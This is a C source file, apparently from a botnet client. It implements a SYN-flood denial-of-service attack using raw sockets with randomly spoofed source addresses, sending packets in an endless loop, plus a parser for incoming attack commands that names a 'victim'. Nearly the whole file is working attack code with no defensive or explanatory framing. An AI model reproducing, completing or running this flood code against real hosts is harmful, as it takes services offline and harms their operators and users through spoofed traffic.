#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <string.h>
#include <sys/time.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>

#include "includes.h"
#include "attack.h"

unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) &oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short) ~sum;

    return (answer);
}

int syn_flood(char *target, uint16_t port, uint32_t count) {
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        char datagram[4096], source_ip[32];
        struct iphdr *iph = (struct iphdr *) datagram;
        struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
        struct sockaddr_in sin;
        struct pseudo_header psh;

        sin.sin_family = AF_INET;
        sin.sin_port = htons(80);
        sin.sin_addr.s_addr = inet_addr(target);

        memset(datagram, 0, 4096);
        //Fill in the IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
        iph->id = htons(54321);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = (u_int32_t) rand();
        iph->daddr = sin.sin_addr.s_addr;

        iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);

        //TCP Header
        tcph->source = htons((uint16_t) rand());
        tcph->dest = htons(port);
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        psh.source_address = (unsigned int) rand();
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(20);

    while(1){
        //srand(time(NULL) + i*100);
        tcph->source = htons((uint16_t) rand());
        memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

        tcph->check = csum((unsigned short *) &psh, sizeof(struct pseudo_header));

        int one = 1;
        const int *val = &one;
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
            printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n", errno, strerror(errno));
            continue;
        }
        // write(0, "sent\n", 5);
        // iph->saddr = (u_int32_t) rand();
        if (sendto(s,datagram,iph->tot_len,0,(struct sockaddr *) &sin,sizeof(sin)) < 0) {
            printf("error\n");
        }
    }

    return 0;
}

BOOL parse_attack(char * attack_str) {
    int atck_type = 0;
    char * victim = NULL;

    char * pch;
    pch = strtok(attack_str," ");

    while (pch != NULL) {
        if(atck_type == 0) {
            atck_type = atoi(pch);
            pch = strtok(NULL, " ");
            continue;
        } 

        if(victim == NULL) {
            victim = pch;
            pch = strtok(NULL, " ");
            continue;
        }

        break;
    }

    if (atck_type != 12) {
        return FALSE;
    }

    if (victim == NULL) {
        return FALSE;
    }

#ifdef DEBUG
    printf("[main] Received attack : \n");
    printf("\t type:  %d \n", atck_type);
    printf("\t victim :  %s \n", victim);
#endif

    return TRUE;
}
